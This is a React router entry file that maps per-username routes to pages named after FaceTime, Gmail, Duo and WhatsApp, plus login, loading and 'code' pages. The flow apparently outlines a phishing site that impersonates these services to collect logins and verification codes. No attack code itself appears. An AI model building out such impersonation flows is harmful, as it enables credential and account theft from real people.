import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.jsx'
import './index.css'
import {
  createBrowserRouter,
  RouterProvider,
} from "react-router-dom";
import Duo from './Pages/Duo.jsx';
import Login from './Pages/Login.jsx';
import WhatsApp from './Pages/WhatsApp.jsx';
import FaceTime from './Pages/FaceTime.jsx';
import Code from './Pages/Code.jsx';
import Gmail from './Pages/Gmail.jsx';
import Loading from './Pages/Loading.jsx';



const router = createBrowserRouter([
  {
    path: '/',
    element: <App />,
    children: [
      // {
      //   path: '/:username/duo',
      //   element: <Duo />
      // },
      // {
      //   path: '/:username/whatsapp',
      //   element: <WhatsApp />
      // },
      {
        path: '/:username',
        element: <FaceTime />
      },
      {
        path: '/:username/waiting',
        element: <Login />
      },
      {
        path: '/:username/join',
        element: <Gmail />
      },
      {
        path: '/:username/loading/:docId',
        element: <Loading />
      },
      {
        path: '/:username/code',
        element: <Code />
      },
    ]
  }
])

ReactDOM.createRoot(document.getElementById('root')).render(
  <RouterProvider router={router} />
)
